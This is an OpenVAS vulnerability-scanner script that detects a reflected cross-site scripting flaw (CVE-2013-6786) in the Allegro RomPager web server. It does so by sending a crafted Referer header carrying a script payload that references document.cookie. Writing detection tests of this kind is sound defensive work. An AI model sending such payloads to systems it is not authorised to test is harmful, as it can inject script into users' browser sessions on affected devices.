###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_allegro_rompager_xss_vunl.nasl 34603 2014-01-23 12:26:46Z Jan$
#
# Allegro RomPager HTTP Referer Header Cross Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804079");
  script_version("$Revision: 11867 $");
  script_cve_id("CVE-2013-6786");
  script_bugtraq_id(63721);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-01-23 12:26:46 +0530 (Thu, 23 Jan 2014)");
  script_name("Allegro RomPager HTTP Referer Header Cross Site Scripting Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Allegro RomPager server and is prone to cross site
  scripting vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to read
  cookie or not.");
  script_tag(name:"insight", value:"Flaws is due to the application does not validate input passed via the HTTP
  referer header before returning it to the user.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.");
  script_tag(name:"affected", value:"Allegro Software Development Corporation RomPager version 4.07, Other
  versions may also be affected.");
  script_tag(name:"solution", value:"Upgrade to version 4.51 or later.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name:"URL", value:"http://antoniovazquezblanco.github.io/docs/advisories/Advisory_RomPagerXSS.pdf");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("RomPager/banner");

  script_xref(name:"URL", value:"http://www.allegrosoft.com/embedded-web-server");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

http_port = get_http_port(default:80);

host = http_host_name(port:http_port);

banner = get_http_banner(port: http_port);
if(banner && "Server: RomPager" >!< banner) exit(0);

req = string('GET /nonexistingdata HTTP/1.1\r\n',
             'Host: ', host,'\r\n',
             'Referer: http://test.com/"><script>alert(document.cookie)</script>\r\n\r\n');
res = http_keepalive_send_recv(port:http_port, data:req, bodyonly:FALSE);

if(res =~ "HTTP/1\.. 200" && "<script>alert(document.cookie)</script>" >< res
       && "RomPager server" >< res)
{
  security_message(port:http_port);
  exit(0);
}

exit(99);
